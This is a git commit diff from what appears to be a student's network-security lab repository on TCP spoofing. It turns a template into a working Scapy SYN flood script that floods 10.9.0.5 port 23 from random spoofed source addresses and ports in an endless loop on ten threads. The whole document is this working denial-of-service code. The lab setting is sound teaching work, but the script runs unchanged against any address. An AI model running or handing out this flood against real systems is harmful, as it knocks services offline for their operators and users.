8f3712c41bca55373770219a2489f6745666ba3e
Nicola <nickbusato0101@gmail.com>
2024-10-17 16:12:13 +0200

    Update

--- 02_TCP_Spoofing/TCPSpoofing_Labsetup/Labsetup/volumes/synflood_draft.py
+++ 02_TCP_Spoofing/TCPSpoofing_Labsetup/Labsetup/volumes/synflood_draft.py
@@ -3,13 +3,33 @@
 from scapy.all import IP, TCP, send
 from ipaddress import IPv4Address
 from random import getrandbits
+import threading
 
-ip = IP(dst="*.*.*.*")
-tcp = TCP(dport=**, flags='S')   # TO BE COMPLETED
-pkt = ip/tcp
+def syn_flood(target_ip, target_port):
+    ip = IP(dst=target_ip)
+    tcp = TCP(dport=target_port, flags='S')
+    pkt = ip/tcp
 
-while True:
-    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # source iP
-    pkt[TCP].sport = getrandbits(16)                 # source port
-    pkt[TCP].seq = getrandbits(32)                   # sequence number
-    send(pkt, verbose = 0)
+    while True:
+        pkt[IP].src = str(IPv4Address(getrandbits(32)))  # Random source IP
+        pkt[TCP].sport = getrandbits(16)                 # Random source port
+        pkt[TCP].seq = getrandbits(32)                   # Random sequence number
+        send(pkt, verbose=0)
+
+if __name__ == "__main__":
+    target_ip = "10.9.0.5"  # Replace with actual target IP
+    target_port = 23        # Replace with actual target port
+
+    # Define number of threads (instances)
+    num_threads = 10
+
+    # Create multiple threads
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=syn_flood, args=(target_ip, target_port))
+        threads.append(t)
+        t.start()
+
+    # Join threads (optional, to wait for completion)
+    for t in threads:
+        t.join()
